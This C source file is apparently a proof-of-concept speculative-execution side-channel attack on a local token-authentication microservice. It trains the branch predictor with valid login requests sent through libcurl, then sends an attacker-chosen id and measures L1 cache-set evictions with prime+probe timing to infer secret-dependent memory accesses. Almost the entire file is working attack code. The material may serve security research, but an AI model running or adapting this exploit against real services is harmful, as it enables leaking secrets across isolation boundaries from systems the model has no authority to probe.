#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>
#include <curl/curl.h>

#include "attacker.h"

#define WAYS 8
#define SETS 64
#define LINE_SIZE 64
#define L1_SIZE (WAYS * SETS * LINE_SIZE)
#define NO_LINES (WAYS * SETS)



#define TRAINING_REPS 100
#define ATTACK_RUNS 100.0

#define EVICTION_THRESHOLD 0

uint8_t probe_array[L1_SIZE] __attribute__((aligned(4096))); // allocates int array of size = L1_SIZE and aligns to page

CURL *curl_handle;

uint64_t c_threshold;
int main(int argc, char* argv[]) {
    //cache_threshold();
    printf("Probe array base address: %p\n", (void*)probe_array);
    printf("expected cache set for byte value 0x91 (145):\n");

    // find threshold
    c_threshold = 150; //cache_threshold(); // or set ~100

    // prep attack and training data for request
    char *valid_data = valid_data = "username=user1&password=password&id=2";;
    char attack_data[64];
    get_inputs(attack_data, argc, argv);
    

    // set up curl 
    curl_global_init(CURL_GLOBAL_ALL);
    curl_handle = curl_easy_init();
    if (curl_handle){
        curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_junk);
    }

    //  ==================== PRIME + PROBE ===================
    int top_sets[SETS+1] = {0};


    // generates baseline set
    int baseline[SETS] = {0};    
    for(int i = 0; i < 1000; i++){
        prime_cache();

        make_request(valid_data); // send valid credentials

        // adds to count to calculate baseline
        check_cache_presence(baseline);
    }

    for (int j = 0; j < 100; j++) {

        int count[SETS] = {0}; // records sets that have been touched
        
        int loops = ATTACK_RUNS;

        while (loops > 0){
            // Train BP
            for(int i = 0; i < TRAINING_REPS; i++){
                make_request(valid_data);
            }
            
            
            prime_cache(); // prime L1 with probe array

            _mm_mfence(); // wait for prime to compelte before sending bad request
            // cache check 
            make_request(attack_data);
            _mm_mfence();

            check_cache_presence(count);
            loops --;
        }
        float highest_diff = 0;
        int set = SETS;
        printf("\n===== Eviction Difs =====\n");
        for (int i = 0; i < SETS; i++) {
            // get avg misses for each attack run
            float avg_baseline = baseline[i] / ATTACK_RUNS; // happens ATTACK_RUNS * 100 times -> attacks are only done 100 times
        
            float diff = (float)count[i] - avg_baseline; 

            // if attack increased eviction more than threshold
            if (diff > EVICTION_THRESHOLD) { 
                printf("Set %d: +%.2f\n", i, diff); // print diff
                if (diff > highest_diff){
                    set = i;
                    highest_diff = diff;
                }
            }
        }
        top_sets[set] ++;
    }
    printf("\n ==== TOP SETS ==== \n");
    for (int i = 0; i < SETS; i++) {
        if (top_sets[i] > 0){
            printf("Set %d: %d\n", i, top_sets[i]);
        }
    }

    curl_easy_cleanup(curl_handle);
    return 0;

}


void prime_cache(){
    // Prime L1 cache
    // just need to hit each cache line once (so will skip indexes on the same line)
    for (int j = 0; j < 5; j++){
        // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
        for (unsigned int i = 0; i < (SETS * LINE_SIZE); i+=LINE_SIZE){
            probe_array[i] = 0; 
        }
    }
}


void check_cache_presence(int *count){
    uint64_t t1, t2;
    unsigned int pid;
    for (unsigned int i = 0; i < (SETS * LINE_SIZE); i+=LINE_SIZE){
            _mm_lfence();
            t1 = __rdtscp(&pid);
            _mm_lfence();

            pid = probe_array[i];

            _mm_lfence();
            t2 = __rdtscp(&pid);
            _mm_lfence();
            
            if (t2 - t1 > c_threshold){
               int set_index = (i / LINE_SIZE) % SETS;
                count[set_index]++;
            }
        }
    
    // printf("%d/%d cache hits\n", present, NO_LINES);
}


// finds hit and miss time  -need to implement loop to find avg + determine cache threshold
volatile int test_data = 2;
void cache_threshold(){
    uint64_t t1, t2, time; 
    uint64_t min = UINT64_MAX;
    uint64_t max = 0;
    unsigned int pid;

    for (int i = 0; i < 1000; i++){
        pid = test_data;
        pid = test_data;

        _mm_lfence();
        t1 = __rdtscp(&pid);
        _mm_lfence();

        pid = test_data;

        _mm_lfence();
        t2 = __rdtscp(&pid);
        _mm_lfence();

        time = t2 - t1;
        if (time > max){
            max = time;
        }
    }


    for (int i = 0; i < 1000; i++){
        _mm_clflush((void*)&test_data);
        _mm_mfence();

        _mm_lfence();
        t1 = __rdtscp(&pid);
        _mm_lfence();

        pid = test_data;

        t2 = __rdtscp(&pid);
        _mm_lfence();

        time = t2 - t1;
        if (min > time){
            min = time;
        }
    }
    
    uint64_t threshold = (min + max)/2;
    printf("fastest miss: %ld\nslowest hit: %ld\n threshold: %ld", min, max, threshold);
}


// send request with curl request for token to microservice
void make_request(char *data){
    curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
    curl_easy_perform(curl_handle); 
}

// returns junk so that curl doesnt write to console
size_t write_junk(void *buffer, size_t size, size_t nmemb, void *userp)
{
    (void)buffer;
    (void)userp;
    return size * nmemb;
}


void get_inputs(char attack_data[], int argc, char* argv[]){
    char *attack_id = "2";
    if (argc == 2){
        attack_id = argv[1]; 
    }
    snprintf(attack_data, 64, "username=user1&password=password&id=%s", attack_id);
    
}